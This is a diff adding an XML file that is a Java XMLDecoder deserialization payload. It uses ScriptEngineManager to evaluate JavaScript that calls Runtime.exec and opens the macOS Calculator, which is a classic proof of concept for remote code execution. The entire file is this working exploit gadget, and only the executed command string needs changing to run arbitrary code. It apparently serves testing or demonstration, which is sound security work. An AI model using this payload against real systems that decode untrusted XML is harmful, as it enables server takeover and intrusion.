@@ -1,0 +1,10 @@
+<java>
+    <new class="javax.script.ScriptEngineManager">
+        <void method="getEngineByName">
+            <string>js</string>
+            <void method="eval">
+                <string><![CDATA[java.lang.Runtime.getRuntime().exec('open /System/Applications/Calculator.app');]]></string>
+            </void>
+        </void>
+    </new>
+</java>
